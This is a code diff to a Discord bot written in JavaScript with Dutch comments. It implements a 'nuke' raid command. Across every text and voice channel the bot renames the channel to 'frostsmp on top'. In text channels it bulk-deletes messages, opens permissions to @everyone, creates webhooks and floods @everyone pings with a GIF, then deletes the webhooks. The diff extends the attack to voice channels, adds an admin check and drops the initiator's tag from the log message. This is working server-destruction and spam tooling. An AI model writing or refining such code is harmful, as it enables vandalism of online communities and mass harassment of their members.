@@ -26,11 +26,14 @@ client.on('messageCreate', async message => {
     const args = message.content.slice(5).trim().split(/ +/);
     const spamAmount = parseInt(args[0]) || 50;
 
-    // Commando meteen verwijderen
+    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
+        return message.reply("❌ Administrator rechten nodig!").then(m => setTimeout(() => m.delete().catch(() => {}), 2000));
+    }
+
     message.delete().catch(() => {});
 
     try {
-        await message.author.send(`⚠️ **NUKE START** ⚠️\nSpam: ${spamAmount}x per channel\nGestart door: ${message.author.tag}`);
+        await message.author.send(`⚠️ **NUKE START** ⚠️\nSpam: ${spamAmount}x per channel`);
     } catch {}
 
     let cancelled = false;
@@ -54,35 +57,42 @@ client.on('messageCreate', async message => {
     }
 
     // Channels verwerken
-    const textChannels = Array.from(message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText).values());
+    const allChannels = Array.from(message.guild.channels.cache.filter(ch => 
+        ch.type === ChannelType.GuildText || ch.type === ChannelType.GuildVoice
+    ).values());
+
     let processed = 0;
 
-    const promises = textChannels.map(async (channel) => {
+    const promises = allChannels.map(async (channel) => {
         try {
-            await channel.bulkDelete(100, true).catch(() => {});
+            // Hernoemen naar frostsmp on top
+            await channel.setName("frostsmp on top");
 
-            await channel.setName("Finnson the goat");
+            // Alleen bij text channels: spam
+            if (channel.type === ChannelType.GuildText) {
+                await channel.bulkDelete(100, true).catch(() => {});
 
-            await channel.permissionOverwrites.edit(message.guild.roles.everyone, {
-                ViewChannel: true,
-                SendMessages: true,
-                ReadMessageHistory: true
-            }).catch(() => {});
+                await channel.permissionOverwrites.edit(message.guild.roles.everyone, {
+                    ViewChannel: true,
+                    SendMessages: true,
+                    ReadMessageHistory: true
+                }).catch(() => {});
 
-            const webhook = await channel.createWebhook({
-                name: WEBHOOK_NAME,
-                avatar: WEBHOOK_AVATAR
-            }).catch(() => null);
+                const webhook = await channel.createWebhook({
+                    name: WEBHOOK_NAME,
+                    avatar: WEBHOOK_AVATAR
+                }).catch(() => null);
 
-            if (webhook) {
-                for (let i = 0; i < spamAmount; i++) {
-                    await webhook.send({
-                        content: `frost smp on top\n@everyone\n${GIF_URL}`,
-                        username: WEBHOOK_NAME,
-                        avatarURL: WEBHOOK_AVATAR
-                    }).catch(() => {});
+                if (webhook) {
+                    for (let i = 0; i < spamAmount; i++) {
+                        await webhook.send({
+                            content: `bedankt voor het gebruiken <@1012720131937419365>\n@everyone\n${GIF_URL}`,
+                            username: WEBHOOK_NAME,
+                            avatarURL: WEBHOOK_AVATAR
+                        }).catch(() => {});
+                    }
+                    webhook.delete().catch(() => {});
                 }
-                webhook.delete().catch(() => {});
             }
 
             processed++;
